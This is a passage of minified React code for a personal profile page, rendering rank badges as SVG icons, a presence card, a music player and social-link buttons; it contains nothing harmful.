                                    className: "bi bi-eye",
                                    viewBox: "0 0 16 16",
                                    children: [
                                      (0, c.jsx)("path", {
                                        d: "M16 8s-3-5.5-8-5.5S0 8 0 8s3 5.5 8 5.5S16 8 16 8zM1.173 8a13.133 13.133 0 0 1 1.66-2.043C4.12 4.668 5.88 3.5 8 3.5c2.12 0 3.879 1.168 5.168 2.457A13.133 13.133 0 0 1 14.828 8c-.058.087-.122.183-.195.288-.335.48-.83 1.12-1.465 1.755C11.879 11.332 10.119 12.5 8 12.5c-2.12 0-3.879-1.168-5.168-2.457A13.134 13.134 0 0 1 1.172 8z",
                                      }),
                                      (0, c.jsx)("path", {
                                        d: "M8 5.5a2.5 2.5 0 1 0 0 5 2.5 2.5 0 0 0 0-5zM4.5 8a3.5 3.5 0 1 1 7 0 3.5 3.5 0 0 1-7 0z",
                                      }),
                                    ],
                                  }),
                                  t.views,
                                ],
                              }),
                              (0, c.jsxs)("div", {
                                className: "flex items-center gap-2",
                                children: [
                                  (0, c.jsx)("p", {
                                    className: "text-xl font-semibold",
                                    children: t.name,
                                  }),
                                  (0, c.jsxs)("div", {
                                    className: "flex flex-row gap-1.5",
                                    children: [
                                      "rizz" === t.url ? M : null,
                                      ((H = t),
                                      H.ranks.map(function (e) {
                                        switch (e) {
                                          case "Rich":
                                            return (0,
                                            c.jsxs)("div", { className: "group flex cursor-pointer flex-col items-center justify-center transition-all duration-300 ease-linear", children: [(0, c.jsxs)("svg", { height: "24", viewBox: "0 0 330 330", width: "24", xmlns: "http://www.w3.org/2000/svg", xmlnsXlink: "http://www.w3.org/1999/xlink", version: "1.1", id: "Layer_1", x: "0px", y: "0px", xmlSpace: "preserve", fill: "#85bb65", children: [(0, c.jsxs)("g", { id: "XMLID_71_", children: [(0, c.jsx)("path", { id: "XMLID_85_", d: "M280,263.768V195c0-51.241-33.69-94.756-80.08-109.574l34.684-28.903C238.022,53.673,240,49.452,240,45 c0-24.813-20.188-45-45-45h-60c-24.813,0-45,20.187-45,45c0,4.452,1.977,8.673,5.396,11.523l34.684,28.903 C83.689,100.244,50,143.759,50,195v68.768C34.394,275.988,25,294.906,25,315c0,8.284,6.716,15,15,15h250c8.284,0,15-6.716,15-15 C305,294.906,295.605,275.988,280,263.768z M174.729,261.476v5.352c0,3.655-3.49,6.86-7.469,6.86c-4.119,0-7.471-3.078-7.471-6.86 v-4.46c-18.539-1.526-30.162-12.478-30.162-20.108c0-4.339,3.803-9.579,8.524-9.579c2.818,0,4.656,1.912,6.602,3.936 c2.715,2.824,6.637,6.902,15.035,8.1v-36.731c-12.663-4.493-27.449-10.609-27.449-31.34c0-16.518,9.945-27.131,27.449-29.551 v-3.912c0-3.789,3.352-6.871,7.471-6.871c3.979,0,7.469,3.211,7.469,6.871v3.509c9.55,1.016,22.928,4.554,22.928,12.906 c0,4.002-3.188,9.584-8.377,9.584c-1.887,0-3.525-0.835-5.422-1.803c-2.178-1.109-4.97-2.533-9.129-3.298v30.134 c10.191,3.845,25.645,11.352,25.645,34.317C200.373,246.212,191.082,258.048,174.729,261.476z" }), (0, c.jsx)("path", { id: "XMLID_88_", d: "M149.84,175.744c0,6.788,3.209,10.102,10.258,13.165v-24.543 C149.839,166.638,149.84,173.359,149.84,175.744z" }), (0, c.jsx)("path", { id: "XMLID_89_", d: "M174.28,213.971v29.6c5.669-2.262,8.439-6.922,8.439-14.133 C182.719,221.503,179.695,217.209,174.28,213.971z" })] }), (0, c.jsx)("g", {}), (0, c.jsx)("g", {}), (0, c.jsx)("g", {}), (0, c.jsx)("g", {}), (0, c.jsx)("g", {}), (0, c.jsx)("g", {}), (0, c.jsx)("g", {}), (0, c.jsx)("g", {}), (0, c.jsx)("g", {}), (0, c.jsx)("g", {}), (0, c.jsx)("g", {}), (0, c.jsx)("g", {}), (0, c.jsx)("g", {}), (0, c.jsx)("g", {}), (0, c.jsx)("g", {})] }), (0, c.jsx)("div", { className: "relative flex justify-center z-10", children: (0, c.jsx)("div", { className: "fixed mt-2 scale-0 rounded p-2 text-sm font-semibold text-white shadow-lg transition-all duration-300 group-hover:scale-100", style: { backgroundColor: H.accentcolor + "80" }, children: (0, c.jsx)("p", { className: "hidden w-full max-w-2xl group-hover:block", children: e }) }) })] });
                                          case "Owner":
                                            return (0,
                                            c.jsxs)("div", { className: "group flex cursor-pointer flex-col items-center justify-center transition-all duration-300 ease-linear", children: [(0, c.jsx)("svg", { height: "24", viewBox: "0 0 512 512", width: "24", xmlns: "http://www.w3.org/2000/svg", children: (0, c.jsx)("path", { d: "m512 268c0 17.9-4.3 34.5-12.9 49.7s-20.1 27.1-34.6 35.4c.4 2.7.6 6.9.6 12.6 0 27.1-9.1 50.1-27.1 69.1-18.1 19.1-39.9 28.6-65.4 28.6-11.4 0-22.3-2.1-32.6-6.3-8 16.4-19.5 29.6-34.6 39.7-15 10.2-31.5 15.2-49.4 15.2-18.3 0-34.9-4.9-49.7-14.9-14.9-9.9-26.3-23.2-34.3-40-10.3 4.2-21.1 6.3-32.6 6.3-25.5 0-47.4-9.5-65.7-28.6-18.3-19-27.4-42.1-27.4-69.1 0-3 .4-7.2 1.1-12.6-14.5-8.4-26-20.2-34.6-35.4-8.5-15.2-12.8-31.8-12.8-49.7 0-19 4.8-36.5 14.3-52.3s22.3-27.5 38.3-35.1c-4.2-11.4-6.3-22.9-6.3-34.3 0-27 9.1-50.1 27.4-69.1s40.2-28.6 65.7-28.6c11.4 0 22.3 2.1 32.6 6.3 8-16.4 19.5-29.6 34.6-39.7 15-10.1 31.5-15.2 49.4-15.2s34.4 5.1 49.4 15.1c15 10.1 26.6 23.3 34.6 39.7 10.3-4.2 21.1-6.3 32.6-6.3 25.5 0 47.3 9.5 65.4 28.6s27.1 42.1 27.1 69.1c0 12.6-1.9 24-5.7 34.3 16 7.6 28.8 19.3 38.3 35.1 9.5 15.9 14.3 33.4 14.3 52.4zm-266.9 77.1 105.7-158.3c2.7-4.2 3.5-8.8 2.6-13.7-1-4.9-3.5-8.8-7.7-11.4-4.2-2.7-8.8-3.6-13.7-2.9-5 .8-9 3.2-12 7.4l-93.1 140-42.9-42.8c-3.8-3.8-8.2-5.6-13.1-5.4-5 .2-9.3 2-13.1 5.4-3.4 3.4-5.1 7.7-5.1 12.9 0 5.1 1.7 9.4 5.1 12.9l58.9 58.9 2.9 2.3c3.4 2.3 6.9 3.4 10.3 3.4 6.7-.1 11.8-2.9 15.2-8.7z", fill: "#cc0011" }) }), (0, c.jsx)("div", { className: "relative flex justify-center z-10", children: (0, c.jsx)("div", { className: "fixed mt-2 scale-0 rounded p-2 text-sm font-semibold text-white shadow-lg transition-all duration-300 group-hover:scale-100", style: { backgroundColor: H.accentcolor + "80" }, children: (0, c.jsx)("p", { className: "hidden w-full max-w-2xl group-hover:block", children: e }) }) })] });
                                          case "Developer":
                                            return (0,
                                            c.jsxs)("div", { className: "group flex cursor-pointer flex-col items-center justify-center transition-all duration-300 ease-linear", children: [(0, c.jsx)("svg", { height: "24", viewBox: "0 0 512 512", width: "24", xmlns: "http://www.w3.org/2000/svg", children: (0, c.jsx)("path", { d: "m512 268c0 17.9-4.3 34.5-12.9 49.7s-20.1 27.1-34.6 35.4c.4 2.7.6 6.9.6 12.6 0 27.1-9.1 50.1-27.1 69.1-18.1 19.1-39.9 28.6-65.4 28.6-11.4 0-22.3-2.1-32.6-6.3-8 16.4-19.5 29.6-34.6 39.7-15 10.2-31.5 15.2-49.4 15.2-18.3 0-34.9-4.9-49.7-14.9-14.9-9.9-26.3-23.2-34.3-40-10.3 4.2-21.1 6.3-32.6 6.3-25.5 0-47.4-9.5-65.7-28.6-18.3-19-27.4-42.1-27.4-69.1 0-3 .4-7.2 1.1-12.6-14.5-8.4-26-20.2-34.6-35.4-8.5-15.2-12.8-31.8-12.8-49.7 0-19 4.8-36.5 14.3-52.3s22.3-27.5 38.3-35.1c-4.2-11.4-6.3-22.9-6.3-34.3 0-27 9.1-50.1 27.4-69.1s40.2-28.6 65.7-28.6c11.4 0 22.3 2.1 32.6 6.3 8-16.4 19.5-29.6 34.6-39.7 15-10.1 31.5-15.2 49.4-15.2s34.4 5.1 49.4 15.1c15 10.1 26.6 23.3 34.6 39.7 10.3-4.2 21.1-6.3 32.6-6.3 25.5 0 47.3 9.5 65.4 28.6s27.1 42.1 27.1 69.1c0 12.6-1.9 24-5.7 34.3 16 7.6 28.8 19.3 38.3 35.1 9.5 15.9 14.3 33.4 14.3 52.4zm-266.9 77.1 105.7-158.3c2.7-4.2 3.5-8.8 2.6-13.7-1-4.9-3.5-8.8-7.7-11.4-4.2-2.7-8.8-3.6-13.7-2.9-5 .8-9 3.2-12 7.4l-93.1 140-42.9-42.8c-3.8-3.8-8.2-5.6-13.1-5.4-5 .2-9.3 2-13.1 5.4-3.4 3.4-5.1 7.7-5.1 12.9 0 5.1 1.7 9.4 5.1 12.9l58.9 58.9 2.9 2.3c3.4 2.3 6.9 3.4 10.3 3.4 6.7-.1 11.8-2.9 15.2-8.7z", fill: "#450006" }) }), (0, c.jsx)("div", { className: "relative flex justify-center z-10", children: (0, c.jsx)("div", { className: "fixed mt-2 scale-0 rounded p-2 text-sm font-semibold text-white shadow-lg transition-all duration-300 group-hover:scale-100", style: { backgroundColor: H.accentcolor + "80" }, children: (0, c.jsx)("p", { className: "hidden w-full max-w-2xl group-hover:block", children: e }) }) })] });
                                          case "Admin":
                                            return (0,
                                            c.jsxs)("div", { className: "group flex cursor-pointer flex-col items-center justify-center transition-all duration-300 ease-linear", children: [(0, c.jsx)("svg", { height: "24", viewBox: "0 0 512 512", width: "24", xmlns: "http://www.w3.org/2000/svg", children: (0, c.jsx)("path", { d: "m512 268c0 17.9-4.3 34.5-12.9 49.7s-20.1 27.1-34.6 35.4c.4 2.7.6 6.9.6 12.6 0 27.1-9.1 50.1-27.1 69.1-18.1 19.1-39.9 28.6-65.4 28.6-11.4 0-22.3-2.1-32.6-6.3-8 16.4-19.5 29.6-34.6 39.7-15 10.2-31.5 15.2-49.4 15.2-18.3 0-34.9-4.9-49.7-14.9-14.9-9.9-26.3-23.2-34.3-40-10.3 4.2-21.1 6.3-32.6 6.3-25.5 0-47.4-9.5-65.7-28.6-18.3-19-27.4-42.1-27.4-69.1 0-3 .4-7.2 1.1-12.6-14.5-8.4-26-20.2-34.6-35.4-8.5-15.2-12.8-31.8-12.8-49.7 0-19 4.8-36.5 14.3-52.3s22.3-27.5 38.3-35.1c-4.2-11.4-6.3-22.9-6.3-34.3 0-27 9.1-50.1 27.4-69.1s40.2-28.6 65.7-28.6c11.4 0 22.3 2.1 32.6 6.3 8-16.4 19.5-29.6 34.6-39.7 15-10.1 31.5-15.2 49.4-15.2s34.4 5.1 49.4 15.1c15 10.1 26.6 23.3 34.6 39.7 10.3-4.2 21.1-6.3 32.6-6.3 25.5 0 47.3 9.5 65.4 28.6s27.1 42.1 27.1 69.1c0 12.6-1.9 24-5.7 34.3 16 7.6 28.8 19.3 38.3 35.1 9.5 15.9 14.3 33.4 14.3 52.4zm-266.9 77.1 105.7-158.3c2.7-4.2 3.5-8.8 2.6-13.7-1-4.9-3.5-8.8-7.7-11.4-4.2-2.7-8.8-3.6-13.7-2.9-5 .8-9 3.2-12 7.4l-93.1 140-42.9-42.8c-3.8-3.8-8.2-5.6-13.1-5.4-5 .2-9.3 2-13.1 5.4-3.4 3.4-5.1 7.7-5.1 12.9 0 5.1 1.7 9.4 5.1 12.9l58.9 58.9 2.9 2.3c3.4 2.3 6.9 3.4 10.3 3.4 6.7-.1 11.8-2.9 15.2-8.7z", fill: "#ff4d5c" }) }), (0, c.jsx)("div", { className: "relative flex justify-center z-10", children: (0, c.jsx)("div", { className: "fixed mt-2 scale-0 rounded p-2 text-sm font-semibold text-white shadow-lg transition-all duration-300 group-hover:scale-100", style: { backgroundColor: H.accentcolor + "80" }, children: (0, c.jsx)("p", { className: "hidden w-full max-w-2xl group-hover:block", children: e }) }) })] });
                                          case "Staff":
                                            return (0,
                                            c.jsxs)("div", { className: "group flex cursor-pointer flex-col items-center justify-center transition-all duration-300 ease-linear", children: [(0, c.jsx)("svg", { height: "24", viewBox: "0 0 512 512", width: "24", xmlns: "http://www.w3.org/2000/svg", children: (0, c.jsx)("path", { d: "m512 268c0 17.9-4.3 34.5-12.9 49.7s-20.1 27.1-34.6 35.4c.4 2.7.6 6.9.6 12.6 0 27.1-9.1 50.1-27.1 69.1-18.1 19.1-39.9 28.6-65.4 28.6-11.4 0-22.3-2.1-32.6-6.3-8 16.4-19.5 29.6-34.6 39.7-15 10.2-31.5 15.2-49.4 15.2-18.3 0-34.9-4.9-49.7-14.9-14.9-9.9-26.3-23.2-34.3-40-10.3 4.2-21.1 6.3-32.6 6.3-25.5 0-47.4-9.5-65.7-28.6-18.3-19-27.4-42.1-27.4-69.1 0-3 .4-7.2 1.1-12.6-14.5-8.4-26-20.2-34.6-35.4-8.5-15.2-12.8-31.8-12.8-49.7 0-19 4.8-36.5 14.3-52.3s22.3-27.5 38.3-35.1c-4.2-11.4-6.3-22.9-6.3-34.3 0-27 9.1-50.1 27.4-69.1s40.2-28.6 65.7-28.6c11.4 0 22.3 2.1 32.6 6.3 8-16.4 19.5-29.6 34.6-39.7 15-10.1 31.5-15.2 49.4-15.2s34.4 5.1 49.4 15.1c15 10.1 26.6 23.3 34.6 39.7 10.3-4.2 21.1-6.3 32.6-6.3 25.5 0 47.3 9.5 65.4 28.6s27.1 42.1 27.1 69.1c0 12.6-1.9 24-5.7 34.3 16 7.6 28.8 19.3 38.3 35.1 9.5 15.9 14.3 33.4 14.3 52.4zm-266.9 77.1 105.7-158.3c2.7-4.2 3.5-8.8 2.6-13.7-1-4.9-3.5-8.8-7.7-11.4-4.2-2.7-8.8-3.6-13.7-2.9-5 .8-9 3.2-12 7.4l-93.1 140-42.9-42.8c-3.8-3.8-8.2-5.6-13.1-5.4-5 .2-9.3 2-13.1 5.4-3.4 3.4-5.1 7.7-5.1 12.9 0 5.1 1.7 9.4 5.1 12.9l58.9 58.9 2.9 2.3c3.4 2.3 6.9 3.4 10.3 3.4 6.7-.1 11.8-2.9 15.2-8.7z", fill: "#020275" }) }), (0, c.jsx)("div", { className: "relative flex justify-center z-10", children: (0, c.jsx)("div", { className: "fixed mt-2 scale-0 rounded p-2 text-sm font-semibold text-white shadow-lg transition-all duration-300 group-hover:scale-100", style: { backgroundColor: H.accentcolor + "80" }, children: (0, c.jsx)("p", { className: "hidden w-full max-w-2xl group-hover:block", children: e }) }) })] });
                                          case "Beta":
                                            return (0,
                                            c.jsxs)("div", { className: "group flex cursor-pointer flex-col items-center justify-center transition-all duration-300 ease-linear", children: [(0, c.jsx)("svg", { height: "24", viewBox: "0 0 512 512", width: "24", xmlns: "http://www.w3.org/2000/svg", children: (0, c.jsx)("path", { d: "m512 268c0 17.9-4.3 34.5-12.9 49.7s-20.1 27.1-34.6 35.4c.4 2.7.6 6.9.6 12.6 0 27.1-9.1 50.1-27.1 69.1-18.1 19.1-39.9 28.6-65.4 28.6-11.4 0-22.3-2.1-32.6-6.3-8 16.4-19.5 29.6-34.6 39.7-15 10.2-31.5 15.2-49.4 15.2-18.3 0-34.9-4.9-49.7-14.9-14.9-9.9-26.3-23.2-34.3-40-10.3 4.2-21.1 6.3-32.6 6.3-25.5 0-47.4-9.5-65.7-28.6-18.3-19-27.4-42.1-27.4-69.1 0-3 .4-7.2 1.1-12.6-14.5-8.4-26-20.2-34.6-35.4-8.5-15.2-12.8-31.8-12.8-49.7 0-19 4.8-36.5 14.3-52.3s22.3-27.5 38.3-35.1c-4.2-11.4-6.3-22.9-6.3-34.3 0-27 9.1-50.1 27.4-69.1s40.2-28.6 65.7-28.6c11.4 0 22.3 2.1 32.6 6.3 8-16.4 19.5-29.6 34.6-39.7 15-10.1 31.5-15.2 49.4-15.2s34.4 5.1 49.4 15.1c15 10.1 26.6 23.3 34.6 39.7 10.3-4.2 21.1-6.3 32.6-6.3 25.5 0 47.3 9.5 65.4 28.6s27.1 42.1 27.1 69.1c0 12.6-1.9 24-5.7 34.3 16 7.6 28.8 19.3 38.3 35.1 9.5 15.9 14.3 33.4 14.3 52.4zm-266.9 77.1 105.7-158.3c2.7-4.2 3.5-8.8 2.6-13.7-1-4.9-3.5-8.8-7.7-11.4-4.2-2.7-8.8-3.6-13.7-2.9-5 .8-9 3.2-12 7.4l-93.1 140-42.9-42.8c-3.8-3.8-8.2-5.6-13.1-5.4-5 .2-9.3 2-13.1 5.4-3.4 3.4-5.1 7.7-5.1 12.9 0 5.1 1.7 9.4 5.1 12.9l58.9 58.9 2.9 2.3c3.4 2.3 6.9 3.4 10.3 3.4 6.7-.1 11.8-2.9 15.2-8.7z", fill: "#fbff00" }) }), (0, c.jsx)("div", { className: "relative flex justify-center z-10", children: (0, c.jsx)("div", { className: "fixed mt-2 scale-0 rounded p-2 text-sm font-semibold text-white shadow-lg transition-all duration-300 group-hover:scale-100", style: { backgroundColor: H.accentcolor + "80" }, children: (0, c.jsx)("p", { className: "hidden w-full max-w-2xl group-hover:block", children: e }) }) })] });
                                          case "Premium":
                                            return (0,
                                            c.jsxs)("div", { className: "group flex cursor-pointer flex-col items-center justify-center transition-all duration-300 ease-linear", children: [(0, c.jsx)("svg", { height: "24", viewBox: "0 0 512 512", width: "24", xmlns: "http://www.w3.org/2000/svg", children: (0, c.jsx)("path", { d: "m512 268c0 17.9-4.3 34.5-12.9 49.7s-20.1 27.1-34.6 35.4c.4 2.7.6 6.9.6 12.6 0 27.1-9.1 50.1-27.1 69.1-18.1 19.1-39.9 28.6-65.4 28.6-11.4 0-22.3-2.1-32.6-6.3-8 16.4-19.5 29.6-34.6 39.7-15 10.2-31.5 15.2-49.4 15.2-18.3 0-34.9-4.9-49.7-14.9-14.9-9.9-26.3-23.2-34.3-40-10.3 4.2-21.1 6.3-32.6 6.3-25.5 0-47.4-9.5-65.7-28.6-18.3-19-27.4-42.1-27.4-69.1 0-3 .4-7.2 1.1-12.6-14.5-8.4-26-20.2-34.6-35.4-8.5-15.2-12.8-31.8-12.8-49.7 0-19 4.8-36.5 14.3-52.3s22.3-27.5 38.3-35.1c-4.2-11.4-6.3-22.9-6.3-34.3 0-27 9.1-50.1 27.4-69.1s40.2-28.6 65.7-28.6c11.4 0 22.3 2.1 32.6 6.3 8-16.4 19.5-29.6 34.6-39.7 15-10.1 31.5-15.2 49.4-15.2s34.4 5.1 49.4 15.1c15 10.1 26.6 23.3 34.6 39.7 10.3-4.2 21.1-6.3 32.6-6.3 25.5 0 47.3 9.5 65.4 28.6s27.1 42.1 27.1 69.1c0 12.6-1.9 24-5.7 34.3 16 7.6 28.8 19.3 38.3 35.1 9.5 15.9 14.3 33.4 14.3 52.4zm-266.9 77.1 105.7-158.3c2.7-4.2 3.5-8.8 2.6-13.7-1-4.9-3.5-8.8-7.7-11.4-4.2-2.7-8.8-3.6-13.7-2.9-5 .8-9 3.2-12 7.4l-93.1 140-42.9-42.8c-3.8-3.8-8.2-5.6-13.1-5.4-5 .2-9.3 2-13.1 5.4-3.4 3.4-5.1 7.7-5.1 12.9 0 5.1 1.7 9.4 5.1 12.9l58.9 58.9 2.9 2.3c3.4 2.3 6.9 3.4 10.3 3.4 6.7-.1 11.8-2.9 15.2-8.7z", fill: "#1da1f2" }) }), (0, c.jsx)("div", { className: "relative flex justify-center z-10", children: (0, c.jsx)("div", { className: "fixed mt-2 scale-0 rounded p-2 text-sm font-semibold text-white shadow-lg transition-all duration-300 group-hover:scale-100", style: { backgroundColor: H.accentcolor + "80" }, children: (0, c.jsx)("p", { className: "hidden w-full max-w-2xl group-hover:block", children: e }) }) })] });
                                          case "Verified":
                                            return (0,
                                            c.jsxs)("div", { className: "group flex cursor-pointer flex-col items-center justify-center transition-all duration-300 ease-linear", children: [(0, c.jsx)("svg", { height: "16", viewBox: "0 0 512 512", width: "16", xmlns: "http://www.w3.org/2000/svg", children: (0, c.jsx)("path", { d: "m512 268c0 17.9-4.3 34.5-12.9 49.7s-20.1 27.1-34.6 35.4c.4 2.7.6 6.9.6 12.6 0 27.1-9.1 50.1-27.1 69.1-18.1 19.1-39.9 28.6-65.4 28.6-11.4 0-22.3-2.1-32.6-6.3-8 16.4-19.5 29.6-34.6 39.7-15 10.2-31.5 15.2-49.4 15.2-18.3 0-34.9-4.9-49.7-14.9-14.9-9.9-26.3-23.2-34.3-40-10.3 4.2-21.1 6.3-32.6 6.3-25.5 0-47.4-9.5-65.7-28.6-18.3-19-27.4-42.1-27.4-69.1 0-3 .4-7.2 1.1-12.6-14.5-8.4-26-20.2-34.6-35.4-8.5-15.2-12.8-31.8-12.8-49.7 0-19 4.8-36.5 14.3-52.3s22.3-27.5 38.3-35.1c-4.2-11.4-6.3-22.9-6.3-34.3 0-27 9.1-50.1 27.4-69.1s40.2-28.6 65.7-28.6c11.4 0 22.3 2.1 32.6 6.3 8-16.4 19.5-29.6 34.6-39.7 15-10.1 31.5-15.2 49.4-15.2s34.4 5.1 49.4 15.1c15 10.1 26.6 23.3 34.6 39.7 10.3-4.2 21.1-6.3 32.6-6.3 25.5 0 47.3 9.5 65.4 28.6s27.1 42.1 27.1 69.1c0 12.6-1.9 24-5.7 34.3 16 7.6 28.8 19.3 38.3 35.1 9.5 15.9 14.3 33.4 14.3 52.4zm-266.9 77.1 105.7-158.3c2.7-4.2 3.5-8.8 2.6-13.7-1-4.9-3.5-8.8-7.7-11.4-4.2-2.7-8.8-3.6-13.7-2.9-5 .8-9 3.2-12 7.4l-93.1 140-42.9-42.8c-3.8-3.8-8.2-5.6-13.1-5.4-5 .2-9.3 2-13.1 5.4-3.4 3.4-5.1 7.7-5.1 12.9 0 5.1 1.7 9.4 5.1 12.9l58.9 58.9 2.9 2.3c3.4 2.3 6.9 3.4 10.3 3.4 6.7-.1 11.8-2.9 15.2-8.7z", fill: "#1da1f2" }) }), (0, c.jsx)("div", { className: "relative flex justify-center z-10", children: (0, c.jsx)("div", { className: "fixed mt-2 scale-0 rounded p-2 text-sm font-semibold text-white shadow-lg transition-all duration-300 group-hover:scale-100", style: { backgroundColor: H.accentcolor + "80" }, children: (0, c.jsx)("p", { className: "hidden w-full max-w-2xl group-hover:block", children: e }) }) })] });
                                        }
                                      })),
                                    ],
                                  }),
                                ],
                              }),
                              (0, c.jsx)("p", {
                                className: "text-sm text-gray-300 ".concat(
                                  F
                                    ? ""
                                    : "truncate max-w-[50vw] md:max-w-[40vw]"
                                ),
                                children: t.description,
                              }),
                            ],
                          }),
                        ],
                      }),
                      t.presence &&
                        null !== t.bio_presence &&
                        (0, c.jsxs)("div", {
                          className:
                            "flex md:flex-row flex-col w-full justify-between gap-2",
                          children: [
                            (0, c.jsxs)("div", {
                              className:
                                "mt-6 flex w-full md:max-w-md px-8 items-center gap-4 rounded-xl p-2",
                              style: { backgroundColor: t.accentcolor + "66" },
                              children: [
                                (0, c.jsx)("img", {
                                  src: t.bio_presence.pfp,
                                  className:
                                    "h-16 w-16 rounded-full border-4 ".concat(
                                      N(t.bio_presence.status)
                                    ),
                                  draggable: !1,
                                  alt: "",
                                }),
                                (0, c.jsxs)("div", {
                                  children: [
                                    (0, c.jsxs)("div", {
                                      className:
                                        "flex mt-2 items-center gap-2 md:flex-nowrap flex-wrap",
                                      children: [
                                        (0, c.jsx)("p", {
                                          className:
                                            "text-sm md:text-lg font-semibold",
                                          children: t.bio_presence.tag.replace(
                                            /[\u0000-\u001F\u007F-\u009F\u200B\u1CBB\u1CBC]/g,
                                            ""
                                          ),
                                        }),
                                        (0, c.jsx)("div", {
                                          className: "flex flex-row gap-0.5",
                                          children:
                                            null !== t.bio_presence.badges &&
                                            L(t),
                                        }),
                                      ],
                                    }),
                                    null !== t.bio_presence.customStatus &&
                                      (0, c.jsxs)("div", {
                                        className:
                                          "text-sm text-gray-300 flex flex-row gap-2",
                                        children: [
                                          null !==
                                          t.bio_presence.customStatus.emoji
                                            ? (0, c.jsx)("img", {
                                                draggable: !1,
                                                src: t.bio_presence.customStatus
                                                  .emoji,
                                                className: "h-5 w-5",
                                                alt: "",
                                              })
                                            : (0, c.jsx)(c.Fragment, {}),
                                          t.bio_presence.customStatus.name,
                                        ],
                                      }),
                                  ],
                                }),
                              ],
                            }),
                            t.bio_presence.activities.length > 0
                              ? (0, c.jsx)(x, { bio: t })
                              : (0, c.jsx)("div", {
                                  className:
                                    "mt-6 flex w-full md:max-w-md px-8 justify-center items-center gap-4 rounded-xl p-2",
                                  style: {
                                    backgroundColor: t.accentcolor + "66",
                                  },
                                  children: (0, c.jsx)("p", {
                                    className: "text-lg font-semibold",
                                    children: "The user isn't playing anything",
                                  }),
                                }),
                          ],
                        }),
                      t.songs.length > 0 &&
                        (0, c.jsx)("div", {
                          className:
                            "mt-6 flex w-full px-8 items-center gap-4 rounded-xl p-2",
                          style: { backgroundColor: t.accentcolor + "66" },
                          children: (0, c.jsx)(v.Z, {
                            ref: D,
                            autoPlay: p,
                            header: o
                              ? "Now playing: " +
                                Z.name
                                  .replace(/\.[^/.]+$/, "")
                                  .replaceAll("_", " ")
                              : "Now playing: -",
                            src: Z.url,
                            showSkipControls: !0,
                            showJumpControls: !1,
                            volume: 0.5,
                            onPlay: function () {
                              return u(function (e) {
                                return z({}, e, { isMusicPlaying: !0 });
                              });
                            },
                            onClickPrevious: function () {
                              u(function (e) {
                                return z({}, e, {
                                  currentMusicIndex:
                                    0 === e.currentMusicIndex
                                      ? t.songs.length - 1
                                      : e.currentMusicIndex - 1,
                                });
                              });
                            },
                            onClickNext: m,
                            onEnded: m,
                            customAdditionalControls: [],
                          }),
                        }),
                      (0, c.jsxs)("div", {
                        className: "mt-5 w-full",
                        children: [
                          " ",
                          (0, c.jsx)("div", {
                            className:
                              "mt-4 flex justify-center gap-4 flex-wrap",
                            children:
                              ((V = t.socials),
                              (A = t.accentcolor),
                              V.map(function (e) {
                                if ("" !== e.name && "" !== e.url)
                                  return e.url.startsWith("https://") ||
                                    e.url.startsWith("http://") ||
                                    e.url.startsWith("mailto:")
                                    ? (0, c.jsxs)("div", {
                                        className:
                                          "group flex cursor-pointer flex-col items-center justify-center transition-all duration-300 ease-linear",
                                        onClick: function () {
                                          open(e.url);
                                        },
                                        children: [
                                          (0, c.jsx)("div", {
                                            className:
                                              " flex cursor-pointer flex-col items-center justify-center rounded-3xl p-2 shadow-lg transition-all duration-300 ease-linear hover:rounded-xl hover:text-white hover:shadow-darkM-700/20",
                                            style: {
                                              backgroundColor: A + "80",
                                            },
                                            children: y(e.name),
                                          }),
                                          (0, c.jsx)("div", {
                                            className:
                                              "relative flex justify-center",
                                            children: (0, c.jsx)("div", {
                                              className:
                                                "fixed mt-2 scale-0 rounded p-2 text-sm font-semibold text-white shadow-lg transition-all duration-300 group-hover:scale-100",
                                              style: {
                                                backgroundColor: A + "80",
                                              },
                                              children: (0, c.jsx)("p", {
                                                className:
                                                  "hidden w-full max-w-2xl group-hover:block",
                                                children:
                                                  "Personal" == e.name
                                                    ? new URL(e.url).hostname
                                                    : e.name,
                                              }),
                                            }),
                                          }),
                                        ],
                                      })
                                    : (0, c.jsxs)("div", {
                                        className:
                                          "group flex cursor-pointer flex-col items-center justify-center transition-all duration-300 ease-linear",
                                        onClick: function () {
                                          w("Text copied to clipboard", "info"),
                                            navigator.clipboard.writeText(
                                              e.url
                                            );
                                        },
                                        children: [
                                          (0, c.jsx)("div", {
                                            className:
                                              " flex cursor-pointer flex-col items-center justify-center rounded-3xl p-2 shadow-lg transition-all duration-300 ease-linear hover:rounded-xl hover:text-white hover:shadow-darkM-700/20",
                                            style: {
                                              backgroundColor: A + "80",
                                            },
                                            children: y(e.name),
                                          }),
                                          (0, c.jsx)("div", {
                                            className:
                                              "relative flex justify-center",
                                            children: (0, c.jsx)("div", {
                                              className:
                                                "fixed mt-2 scale-0 rounded p-2 text-sm font-semibold text-white shadow-lg transition-all duration-300 group-hover:scale-100",
                                              style: {
                                                backgroundColor: A + "80",
                                              },
                                              children: (0, c.jsx)("p", {
                                                className:
                                                  "hidden w-full max-w-2xl group-hover:block",
                                                children: e.url,
                                              }),
                                            }),
                                          }),
                                        ],
                                      });
                              })),
                          }),
                        ],
                      }),
                      (0, c.jsx)("div", {
                        className: "mt-5 w-full",
                        children: (0, c.jsx)("div", {
                          className:
                            "mt-2 flex justify-center items-center gap-4 flex-row w-full",
                          children:
                            ((S = t.embeds),
                            S.map(function (e) {
                              if ("" !== e)
                                return (0, c.jsxs)(j.p, {
                                  className: "flex flex-col",
                                  as: "div",
                                  children: [
                                    (0, c.jsx)(j.p.Button, {
                                      className: "",
                                      children: (0, c.jsx)("button", {
                                        type: "button",
                                        style: {
                                          backgroundColor: "".concat(P(e)),
                                          width: "".concat(
                                            h
                                              ? 44 /
                                                  S.filter(function (e) {
                                                    return "" !== e;
                                                  }).length
                                              : 17 /
                                                  S.filter(function (e) {
                                                    return "" !== e;
                                                  }).length,
                                            "rem"
                                          ),
                                        },
                                        className:
                                          "rounded p-1 px-2 text-sm font-semibold transition-all ease-in-out active:translate-y-[2px]",
                                        children: T(e),
                                      }),
                                    }),
                                    (0, c.jsx)(C.u, {
                                      as: a.Fragment,
                                      enter: "ease-out duration-200",
                                      enterFrom: "opacity-30",
                                      enterTo: "opacity-100 scale-100",
                                      leave: "ease-in duration-100",
                                      leaveFrom: "opacity-100 scale-100",
                                      leaveTo: "opacity-0 scale-95",
                                      children: (0, c.jsx)(j.p.Panel, {
                                        className:
                                          "absolute left-0 right-0 ml-auto mr-auto mt-10 w-[calc(100%-4.5rem)] z-10 max-w-3xl pb-8",
                                        children: (0, c.jsx)("div", {
                                          className:
                                            "border-b-2 border-b-darkM-900 p-3 rounded-bl-xl rounded-br-xl",
                                          style: {
